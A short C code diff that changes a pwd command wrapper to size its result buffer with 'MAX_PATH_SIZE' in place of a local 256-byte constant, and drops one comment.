@@ -11,14 +11,12 @@ BOOL wrapPwd(PParser arguments)
 
     PPackage output = newPackage(0, FALSE);
     
-    #define MAX_RESULT_SIZE 256
-    char result[MAX_RESULT_SIZE];
+    char result[MAX_PATH_SIZE];
     result[0] = '\0'; // Initialize the result string
-    BOOL success = basePwd(result, MAX_RESULT_SIZE);
+    BOOL success = basePwd(result, MAX_PATH_SIZE);
 
     if (!success)
     {
-        // Add an error message without using std::string
         addString(output, "[PWD] Error getting current working directory!\n", FALSE);
     }
     else
